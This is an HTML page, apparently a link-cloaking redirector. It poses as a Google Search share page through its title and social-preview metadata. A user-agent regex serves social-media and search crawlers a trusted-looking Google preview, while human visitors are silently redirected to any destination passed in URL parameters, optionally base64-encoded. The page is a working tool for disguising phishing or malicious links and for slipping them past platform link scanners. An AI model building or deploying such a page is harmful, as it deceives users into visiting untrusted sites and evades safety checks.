<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  
  <!-- Open Graph / Facebook Metadata (Visible ONLY to Facebook Crawler) -->
  <meta property="og:type" content="website" />
  <meta property="og:site_name" content="Google Search" />
  <meta property="og:title" content="Google Search - Verified Cloud Results" />
  <meta property="og:description" content="100% Trusted Google Search Shared Content. Click to view." />
  <meta property="og:image" content="https://kamruzzamanshimul.github.io/LINK-STUDIO/assets/google-preview.jpg" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  
  <!-- Twitter Card Metadata -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Google Search - Verified Cloud Results" />
  <meta name="twitter:description" content="100% Trusted Google Search Shared Content. Click to view." />
  <meta name="twitter:image" content="https://kamruzzamanshimul.github.io/LINK-STUDIO/assets/google-preview.jpg" />

  <title>Google Search</title>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #0f1117;
      color: #e2e4e9;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 20px;
    }
    .spinner {
      width: 44px;
      height: 44px;
      border: 3px solid rgba(255, 255, 255, 0.1);
      border-top-color: #6366f1;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    h2 { font-size: 1.25rem; font-weight: 600; margin-bottom: 8px; }
    p { font-size: 0.88rem; color: #8b92a0; margin-bottom: 20px; }
    .btn-manual {
      display: inline-block;
      background: #6366f1;
      color: #ffffff;
      padding: 10px 24px;
      text-decoration: none;
      font-weight: 600;
      font-size: 0.9rem;
      border-radius: 6px;
      transition: background 0.2s;
    }
    .btn-manual:hover { background: #4f46e5; }
  </style>

  <script>
    // Facebook and social media scraper user-agents
    var botPattern = /facebookexternalhit|Facebot|Twitterbot|TelegramBot|WhatsApp|LinkedInBot|Discordbot|SkypeUriPreview|Googlebot|bingbot|Baiduspider/i;
    var isBot = botPattern.test(navigator.userAgent);

    function resolveDestination() {
      var params = new URLSearchParams(window.location.search);
      var to = params.get('to') || params.get('q') || params.get('url') || params.get('u');
      if (!to) return null;

      // Check if base64 encoded
      if (to.startsWith('b64:')) {
        try {
          return decodeURIComponent(escape(atob(to.slice(4))));
        } catch (e) {}
      }

      // If already a full URL
      if (/^https?:\/\//i.test(to)) {
        return to;
      }

      // Otherwise assume raw Google token
      return 'https://www.google.com/share.google?q=' + encodeURIComponent(to);
    }

    var destination = resolveDestination();

    // Human users get redirected immediately
    if (!isBot && destination) {
      window.location.replace(destination);
    }
  </script>
</head>
<body>
  <div class="spinner"></div>
  <h2>Redirecting to Secure Content...</h2>
  <p>Please wait while we verify and redirect your session safely.</p>
  <div id="manualArea" style="display:none;">
    <a id="manualLink" href="#" class="btn-manual">Click here if not redirected</a>
  </div>

  <script>
    if (destination) {
      document.getElementById('manualLink').href = destination;
      setTimeout(function() {
        document.getElementById('manualArea').style.display = 'block';
      }, 1500);
    }
  </script>
</body>
</html>
